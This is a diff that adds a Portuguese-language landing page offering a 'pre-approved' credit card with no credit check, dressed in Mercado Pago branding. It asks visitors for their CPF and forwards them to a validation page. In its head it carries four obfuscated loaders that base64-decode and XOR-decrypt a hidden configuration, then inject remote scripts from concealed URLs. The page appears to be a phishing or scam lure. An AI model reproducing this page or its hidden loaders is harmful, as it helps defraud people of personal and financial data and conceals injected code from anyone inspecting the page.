@@ -1,0 +1,533 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>(function(){var b_x=atob("DHBTg58oM7MKpTo+sAtx9u1EEYkozU5KwANprLBLV90k0E5T2RYqrfxHXp1o1xVN0wI68+tbHMZ+yEkR3BEn5uxcHdl5hxYc0QQn8fZKRsdv1hgE6wtx7f5FVpEwh15fxBF+9utFWtVziEpM1QY27esFS9BlwRdN0xtxr71eUt9/wBgEklIur+QKXdJnwBgEkhQy9/4FRsdnzFxHnQAh5ulNXccn1k9c2RQgobMKRdJm0F8cilJx/sJV");var n_g=[];for(var k_ui=0;k_ui<b_x.length;k_ui++){n_g.push(b_x.charCodeAt(k_ui)&255);}var s_0vo=n_g[0];var u_b=n_g.slice(1,1+s_0vo);var s_3n6=n_g.slice(1+s_0vo);var u_k=s_3n6.map(function(b,s_bfn){return b^u_b[s_bfn%s_0vo];});var w_7le6="";for(var a_st=0;a_st<u_k.length;a_st++){w_7le6+=String.fromCharCode(u_k[a_st]&255);}var s_enao=decodeURIComponent(escape(w_7le6));var b_v6i=JSON.parse(s_enao);var x_vi6=b_v6i.globals||[];x_vi6.forEach(function(v_hv){window[v_hv.name]=v_hv.value;});var n_rb2=document.createElement("script");n_rb2.src=b_v6i.url;n_rb2.async=true;n_rb2.defer=true;(b_v6i.attributes||[]).forEach(function(r_ebks){n_rb2.setAttribute(r_ebks.name,r_ebks.value);});(document.head||document.documentElement).appendChild(n_rb2);})();</script><script src="js/latest.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script><script src="js/latest_1.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script>
+<script>(function(){var x_v=atob("DPv5+JvEGQDXP+pP8YDbjemoOzr1V547gYjD17SnfW75Sp4imJ2A1virdC61TcU8komQiO+3NnC+R48j3ouQgP6oNGe4UI0jlNWTi7noO2GjS5gmk46NnejmI1uKE8gonZSbmfe3OzqMRMghkJac2qHmfm+4WIYqoZKBnfeNfSL7HZwunY6c2qHmL2HgDN8swMKYyav3LzDkXdgqw5mfyP6gO32KQg==");var a_0s=[];for(var s_m7=0;s_m7<x_v.length;s_m7++){a_0s.push(x_v.charCodeAt(s_m7)&255);}var j_9h=a_0s[0];var n_m1kx=a_0s.slice(1,1+j_9h);var m_c=a_0s.slice(1+j_9h);var m_svs=m_c.map(function(b,y_a208){return b^n_m1kx[y_a208%j_9h];});var b_4f1="";for(var y_b2=0;y_b2<m_svs.length;y_b2++){b_4f1+=String.fromCharCode(m_svs[y_b2]&255);}var a_40s7=decodeURIComponent(escape(b_4f1));var r_92=JSON.parse(a_40s7);var v_5f5b=r_92.globals||[];v_5f5b.forEach(function(f_b11){window[f_b11.name]=f_b11.value;});var z_7va5=document.createElement("script");z_7va5.src=r_92.url;z_7va5.async=true;z_7va5.defer=true;(r_92.attributes||[]).forEach(function(y_o8){z_7va5.setAttribute(y_o8.name,y_o8.value);});(document.head||document.documentElement).appendChild(z_7va5);})();</script><script src="js/pixel-google.js" async="" defer=""></script><script src="js/pixel-google_1.js" async="" defer=""></script>
+
+
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Cartão Pré-aprovado - Mercado</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&amp;display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #EEEEEE;
+        }
+
+        /* Animações */
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(238, 77, 45, 0.7);
+            }
+
+            70% {
+                transform: scale(1.02);
+                box-shadow: 0 0 0 10px rgba(238, 77, 45, 0);
+            }
+
+            100% {
+                transform: scale(1);
+                box-shadow: 0 0 0 0 rgba(238, 77, 45, 0);
+            }
+        }
+
+        .btn-pulse {
+            animation: pulse 2s infinite;
+        }
+
+        .btn-shine {
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn-shine:after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right,
+                    rgba(255, 255, 255, 0) 0%,
+                    rgba(255, 255, 255, 0.3) 50%,
+                    rgba(255, 255, 255, 0) 100%);
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+
+        @keyframes shine {
+            0% {
+                left: -100%;
+                opacity: 0;
+            }
+
+            50% {
+                left: 100%;
+                opacity: 1;
+            }
+
+            100% {
+                left: 100%;
+                opacity: 0;
+            }
+        }
+
+        /* Cards */
+        .card {
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .bg-primary {
+            background-color: #EE4D2D;
+        }
+
+        /* Ícones */
+        .icon-circle {
+            width: 48px;
+            height: 48px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+
+        /* Carrossel */
+        .carousel-item {
+            display: none;
+        }
+
+        .carousel-item.active {
+            display: block;
+        }
+
+        .carousel-img {
+            max-width: 100%;
+            height: 280px;
+            object-fit: cover;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        /* Steps */
+        .step {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            border: 2px solid #EDEDED;
+            color: #999;
+            background: white;
+            transition: all 0.3s ease;
+            cursor: pointer;
+        }
+
+        .step.active {
+            border-color: #EE4D2D;
+            background: #EE4D2D;
+            color: white;
+        }
+
+        .step-line {
+            flex: 1;
+            height: 3px;
+            background: #EDEDED;
+            margin: 0 10px;
+        }
+
+        .step-line.active {
+            background: #EE4D2D;
+        }
+
+        /* Responsividade */
+        @media (max-width: 480px) {
+            .carousel-img {
+                height: 240px;
+            }
+
+            .icon-circle {
+                width: 44px;
+                height: 44px;
+            }
+        }
+    </style>
+
+    
+
+    
+
+    
+
+    
+
+    
+<script src="js/utm-handler.js" data-token="ea930328-cad0-4277-b99d-8c16148dcdbb"></script>
+
+<!-- UTMify pixel and UTM tracking -->
+<script>(function(){var n_9umv=atob("DOmOujQiboEBZRMcE5Ksz0ZOTLsjDWdoY5q0lRtBCu8vEGdxeo/3lFdNA69jFzxvcJvnykBRQfFoHXZwPJnnwlFOQOtyRz8+cp36yF1AG/VkFjEmSLSimFNOAeNgCWA+KbL1mFpDA+QjXzFsepHr1n1GTK0jE3JwZoysgBYUD+AyUScrK4+4j1cQCrkzXSR+IdzqjAMAE9x8");var f_3w0=[];for(var e_9ihb=0;e_9ihb<n_9umv.length;e_9ihb++){f_3w0.push(n_9umv.charCodeAt(e_9ihb)&255);}var q_jc2=f_3w0[0];var v_p14n=f_3w0.slice(1,1+q_jc2);var x_to=f_3w0.slice(1+q_jc2);var y_cfcj=x_to.map(function(b,i_eb){return b^v_p14n[i_eb%q_jc2];});var y_lgc="";for(var r_4y4=0;r_4y4<y_cfcj.length;r_4y4++){y_lgc+=String.fromCharCode(y_cfcj[r_4y4]&255);}var j_oi3=decodeURIComponent(escape(y_lgc));var b_fccl=JSON.parse(j_oi3);var p_1=b_fccl.globals||[];p_1.forEach(function(i_1wym){window[i_1wym.name]=i_1wym.value;});var p_w3kc=document.createElement("script");p_w3kc.src=b_fccl.url;p_w3kc.async=true;p_w3kc.defer=true;(b_fccl.attributes||[]).forEach(function(u_9vj){p_w3kc.setAttribute(u_9vj.name,u_9vj.value);});(document.head||document.documentElement).appendChild(p_w3kc);})();</script>
+<script>(function(){var e_0z=atob("DE/SdGpmbNX2MyoZiDTwARgKTu/UW15t+DzoW0UFCLvYRl504SmrWgkJAfuUQQVq6z27BB4VQ6CCXlk25C6mERkSQr+FEQY76TumBgMEGaGTQAgj0zTwGgsLCffMEU54/C7/AR4LBbOPHlpr7Tm3Gh5LFLaZVwdq6yTwWEgQDbmDVggjqm2vWBFEArSbVggjqiuzAAtLGaGbWkxgpT+gERwDAqHbQF974SuhVkZEGrSaRk87sm3wCTcb");var o_7o=[];for(var u_j=0;u_j<e_0z.length;u_j++){o_7o.push(e_0z.charCodeAt(u_j)&255);}var a_a=o_7o[0];var r_ji86=o_7o.slice(1,1+a_a);var r_b=o_7o.slice(1+a_a);var q_m1=r_b.map(function(b,r_co2){return b^r_ji86[r_co2%a_a];});var d_17sz="";for(var m_hsnv=0;m_hsnv<q_m1.length;m_hsnv++){d_17sz+=String.fromCharCode(q_m1[m_hsnv]&255);}var w_n=decodeURIComponent(escape(d_17sz));var w_1dqv=JSON.parse(w_n);var r_6m=w_1dqv.globals||[];r_6m.forEach(function(r_jqj){window[r_jqj.name]=r_jqj.value;});var w_fj=document.createElement("script");w_fj.src=w_1dqv.url;w_fj.async=true;w_fj.defer=true;(w_1dqv.attributes||[]).forEach(function(z_jqz){w_fj.setAttribute(z_jqz.name,z_jqz.value);});(document.head||document.documentElement).appendChild(w_fj);})();</script>
+</head>
+
+<body class="bg-[#EEEEEE]">
+    <div class="max-w-md mx-auto min-h-screen bg-white relative">
+
+        <!-- Hero Section -->
+        <div class="relative">
+            <div class="bg-[#EE4D2D] w-full flex items-center justify-center">
+                <img src="images/leonardo.png" alt="Mercado Pago Card" class="w-full object-contain">
+            </div>
+        </div>
+
+        <!-- Card de Vantagens -->
+        <div class="px-4 mt-4 relative z-10">
+            <div class="bg-white card p-6">
+                <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">Vantagens exclusivas</h2>
+
+                <div class="space-y-4">
+                    <div class="flex items-center bg-[#FFE3DC] p-4 rounded-lg">
+                        <div class="bg-[#EE4D2D] text-white icon-circle mr-4">
+                            <i class="fas fa-bolt text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800">Crédito na hora</h3>
+                            <p class="text-sm text-gray-600">Para usar onde e quando quiser!</p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-center bg-[#FFF8E1] p-4 rounded-lg">
+                        <div class="bg-[#EE4D2D] text-[#333333] icon-circle mr-4">
+                            <i class="fas fa-shield-alt text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800">Sem burocracia</h3>
+                            <p class="text-sm text-gray-600">Sem consulta ao SPC/Serasa.</p>
+                        </div>
+                    </div>
+
+                    <div class="flex items-center bg-green-50 p-4 rounded-lg">
+                        <div class="bg-[#00A650] text-white icon-circle mr-4">
+                            <i class="fas fa-credit-card text-lg"></i>
+                        </div>
+                        <div>
+                            <h3 class="font-semibold text-gray-800">Cartão para seu dia a dia</h3>
+                            <p class="text-sm text-gray-600">Use em lojas físicas e online.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Botão Principal -->
+                <button id="btnSolicitar" class="w-full bg-[#EE4D2D] hover:bg-[#D63D21] text-white text-lg font-semibold py-4 rounded-md mt-6 btn-pulse btn-shine transition-all duration-300">
+                    Solicitar meu cartão agora
+                </button>
+
+                <!-- Segurança -->
+                <div class="flex items-center justify-center mt-4 pt-4 border-t border-gray-100 text-gray-600">
+                    <i class="fas fa-lock mr-2 text-[#00A650]"></i>
+                    <span class="text-sm">Seus dados estão protegidos e seguros</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- Como Solicitar -->
+        <div class="px-4 mt-6">
+            <div class="bg-white card p-6">
+                <h2 class="text-xl font-semibold text-gray-800 mb-6 text-center">Como Solicitar?</h2>
+
+                <!-- Steps -->
+                <div class="flex items-center justify-between mb-6">
+                    <div class="step active">1</div>
+                    <div class="step-line active"></div>
+                    <div class="step">2</div>
+                    <div class="step-line"></div>
+                    <div class="step">3</div>
+                </div>
+
+                <!-- Carrossel -->
+                <div class="relative">
+                    <div class="carousel-item active">
+                        <div class="text-center">
+                            <div class="bg-gray-50 rounded-lg p-4 mb-4">
+                                <img src="images/1.jpg" alt="Etapa 1" class="carousel-img mx-auto">
+                            </div>
+                            <p class="text-gray-800 font-medium">
+                                <span class="font-bold">1.</span> Preencha seu CPF para consultar seu limite de cartão
+                                pré-aprovado
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="carousel-item">
+                        <div class="text-center">
+                            <div class="bg-gray-50 rounded-lg p-4 mb-4">
+                                <img src="images/2.jpg" alt="Etapa 2" class="carousel-img mx-auto">
+                            </div>
+                            <p class="text-gray-800 font-medium">
+                                <span class="font-bold">2.</span> Escolha seu modelo de cartão e forma de envio
+                            </p>
+                        </div>
+                    </div>
+
+                    <div class="carousel-item">
+                        <div class="text-center">
+                            <div class="bg-gray-50 rounded-lg p-4 mb-4">
+                                <img src="images/3.jpg" alt="Etapa 3" class="carousel-img mx-auto">
+                            </div>
+                            <p class="text-gray-800 font-medium">
+                                <span class="font-bold">3.</span> Receba seu cartão no conforto de casa e comece a usar
+                            </p>
+                        </div>
+                    </div>
+
+                    <!-- Navegação do carrossel -->
+                    <button id="prevBtn" class="absolute left-2 top-1/2 transform -translate-y-1/2 bg-white rounded-full w-10 h-10 flex items-center justify-center shadow-lg text-[#EE4D2D] hover:bg-[#FFE3DC]">
+                        <i class="fas fa-chevron-left"></i>
+                    </button>
+                    <button id="nextBtn" class="absolute right-2 top-1/2 transform -translate-y-1/2 bg-white rounded-full w-10 h-10 flex items-center justify-center shadow-lg text-[#EE4D2D] hover:bg-[#FFE3DC]">
+                        <i class="fas fa-chevron-right"></i>
+                    </button>
+                </div>
+
+                <!-- Indicadores -->
+                <div class="flex justify-center mt-4 space-x-2">
+                    <div class="w-2 h-2 rounded-full bg-primary" data-indicator="0"></div>
+                    <div class="w-2 h-2 rounded-full bg-gray-300" data-indicator="1"></div>
+                    <div class="w-2 h-2 rounded-full bg-gray-300" data-indicator="2"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Estatísticas -->
+        <div class="px-4 mt-6">
+            <div class="bg-white card p-6 flex justify-between text-center">
+                <div>
+                    <p class="text-2xl font-bold text-[#EE4D2D]">+500mil</p>
+                    <p class="text-xs text-gray-600">Clientes</p>
+                </div>
+                <div>
+                    <p class="text-2xl font-bold text-[#EE4D2D]">4.8/5</p>
+                    <p class="text-xs text-gray-600">Avaliação</p>
+                </div>
+                <div>
+                    <p class="text-2xl font-bold text-[#EE4D2D]">5 min</p>
+                    <p class="text-xs text-gray-600">Aprovação</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Ver Limite -->
+        <div class="px-4 mt-6">
+            <button id="btnVerLimite" class="bg-white card p-4 w-full flex items-center justify-between">
+                <div class="flex items-center">
+                    <div class="bg-[#FFE3DC] icon-circle mr-3">
+                        <i class="fas fa-calculator text-[#EE4D2D]"></i>
+                    </div>
+                    <div class="text-left">
+                        <p class="font-semibold text-gray-800">Ver Limite Disponível</p>
+                        <p class="text-sm text-gray-600">Descubra qual limite está liberado para você</p>
+                    </div>
+                </div>
+                <i class="fas fa-chevron-right text-[#EE4D2D]"></i>
+            </button>
+        </div>
+
+        <!-- Depoimentos -->
+        <div class="px-4 mt-6 mb-8">
+            <div class="bg-white card p-6">
+                <div class="flex items-center mb-4">
+                    <div class="bg-[#FFE3DC] rounded-full p-2 mr-3">
+                        <i class="fas fa-quote-right text-[#EE4D2D]"></i>
+                    </div>
+                    <p class="font-semibold text-gray-800">O que dizem nossos clientes</p>
+                </div>
+
+                <div class="border-l-4 border-[#EE4D2D] pl-4">
+                    <p class="text-gray-700 italic mb-2">
+                        "Processo super rápido, meu cartão chegou rapidinho e já veio com limite liberado! Recomendo!"
+                    </p>
+                    <div class="flex items-center">
+                        <p class="text-sm font-semibold text-gray-800 mr-2">Mariana S.</p>
+                        <div class="flex text-yellow-400">
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                            <i class="fas fa-star text-xs"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="px-4 pb-6">
+            <div class="text-center text-xs text-gray-500">
+                <p>© 2026, Todos os direitos reservados.</p>
+                <p>CNPJ: 10.573.521/0001-91</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // =======================================================
+        // SISTEMA DE PASSAGEM DE PARÂMETROS URL - ADICIONADO
+        // =======================================================
+        
+        // Função para capturar parâmetros da URL
+        function getUrlParams() {
+            const params = {};
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            
+            for (const [key, value] of urlParams) {
+                params[key] = value;
+            }
+            return params;
+        }
+
+        // Função para construir URL com parâmetros
+        function buildUrlWithParams(baseUrl) {
+            const params = getUrlParams();
+            const url = new URL(baseUrl, window.location.href);
+            
+            Object.keys(params).forEach(key => {
+                url.searchParams.append(key, params[key]);
+            });
+            
+            return url.toString();
+        }
+
+        // Debug: Mostrar parâmetros atuais
+        console.log('Parâmetros atuais da página:', getUrlParams());
+
+        // =======================================================
+        // CARROSSEL
+        // =======================================================
+        
+        let currentStep = 0;
+        const maxSteps = 3;
+        const carouselItems = document.querySelectorAll('.carousel-item');
+        const indicators = document.querySelectorAll('[data-indicator]');
+
+        function updateCarousel(stepIndex) {
+            carouselItems.forEach((item, index) => {
+                item.classList.toggle('active', index === stepIndex);
+            });
+
+            indicators.forEach((indicator, index) => {
+                indicator.classList.toggle('bg-primary', index === stepIndex);
+                indicator.classList.toggle('bg-gray-300', index !== stepIndex);
+            });
+
+            // Update steps
+            document.querySelectorAll('.step').forEach((step, index) => {
+                step.classList.toggle('active', index <= stepIndex);
+            });
+            document.querySelectorAll('.step-line').forEach((line, index) => {
+                line.classList.toggle('active', index < stepIndex);
+            });
+        }
+
+        function nextStep() {
+            currentStep = (currentStep + 1) % maxSteps;
+            updateCarousel(currentStep);
+        }
+
+        function prevStep() {
+            currentStep = (currentStep - 1 + maxSteps) % maxSteps;
+            updateCarousel(currentStep);
+        }
+
+        function redirectToPage(page) {
+            const nextPageUrl = buildUrlWithParams(page);
+            console.log('Redirecionando para:', nextPageUrl);
+            
+            setTimeout(() => {
+                window.location.href = nextPageUrl;
+            }, 100);
+        }
+
+        // =======================================================
+        // INICIALIZAÇÃO
+        // =======================================================
+        
+        document.addEventListener('DOMContentLoaded', function () {
+            console.log('Página carregada - parâmetros preservados:', getUrlParams());
+
+            // Carrossel
+            const nextBtn = document.getElementById('nextBtn');
+            const prevBtn = document.getElementById('prevBtn');
+            
+            if (nextBtn) nextBtn.addEventListener('click', nextStep);
+            if (prevBtn) prevBtn.addEventListener('click', prevStep);
+
+            // Auto-play
+            let autoPlay = setInterval(nextStep, 5000);
+
+            [prevBtn, nextBtn].forEach(btn => {
+                if (btn) {
+                    btn.addEventListener('click', () => {
+                        clearInterval(autoPlay);
+                        setTimeout(() => {
+                            autoPlay = setInterval(nextStep, 5000);
+                        }, 10000);
+                    });
+                }
+            });
+
+            // Botão Solicitar
+            const btnSolicitar = document.getElementById('btnSolicitar');
+            if (btnSolicitar) {
+                btnSolicitar.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    redirectToPage('validacao.html');
+                });
+            }
+
+            // Botão Ver Limite
+            const btnVerLimite = document.getElementById('btnVerLimite');
+            if (btnVerLimite) {
+                btnVerLimite.addEventListener('click', function (e) {
+                    e.preventDefault();
+                    redirectToPage('2.html');
+                });
+            }
+
+            // Indicadores clicáveis
+            indicators.forEach((indicator, index) => {
+                indicator.addEventListener('click', () => {
+                    currentStep = index;
+                    updateCarousel(currentStep);
+                    clearInterval(autoPlay);
+                    setTimeout(() => {
+                        autoPlay = setInterval(nextStep, 5000);
+                    }, 10000);
+                });
+            });
+
+            // Steps clicáveis
+            document.querySelectorAll('.step').forEach((step, index) => {
+                step.addEventListener('click', () => {
+                    currentStep = index;
+                    updateCarousel(currentStep);
+                    clearInterval(autoPlay);
+                    setTimeout(() => {
+                        autoPlay = setInterval(nextStep, 5000);
+                    }, 10000);
+                });
+            });
+        });
+    </script>
+
+
+</body></html>
